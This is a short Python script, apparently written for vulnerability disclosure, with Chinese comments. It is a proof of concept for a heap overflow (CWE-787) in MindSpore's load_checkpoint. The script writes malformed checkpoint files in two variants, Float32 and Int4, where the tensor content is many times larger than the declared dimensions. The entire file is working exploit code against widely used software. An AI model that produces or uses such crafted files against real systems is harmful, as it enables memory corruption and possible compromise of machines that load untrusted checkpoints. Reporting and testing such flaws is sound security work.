# -*- coding: utf-8 -*-
"""构造 MindSpore load_checkpoint 堆溢出 PoC（CWE-787）。

用法：
    python craft_poc.py float32   # 生成 poc_heapoverflow.ckpt (dims=[2], 256B content)
    python craft_poc.py int4      # 生成 int4_d2_c64.ckpt (dims=[2] qint4x2, 64B content)

环境：pip install mindspore（任意版本，仅用 checkpoint_pb2 构造 proto）
"""
import sys
from mindspore.train.checkpoint_pb2 import Checkpoint


def craft(dtype: str, dims: list, content: bytes, out: str) -> None:
    msg = Checkpoint()
    v = msg.value.add()
    v.tag = 'x'
    v.tensor.tensor_type = dtype
    v.tensor.dims.extend(dims)
    v.tensor.tensor_content = content
    with open(out, 'wb') as f:
        f.write(msg.SerializeToString())
    print(f"[+] crafted {out}: dtype={dtype} dims={dims} content={len(content)}B")


if __name__ == '__main__':
    mode = sys.argv[1] if len(sys.argv) > 1 else 'float32'
    if mode == 'float32':
        # Float32: dims=[2] 期望 2*4=8B，实际 256B（32 倍）
        craft('Float32', [2], b'\x00\x00\x80\x3f' * 64, 'poc_heapoverflow.ckpt')
    elif mode == 'int4':
        # Int4(qint4x2): dims=[2] 期望 1B（2元素打包1字节），实际 64B
        craft('Int4', [2], b'\x12' * 64, 'int4_d2_c64.ckpt')
    else:
        print('unknown mode:', mode)
        sys.exit(1)
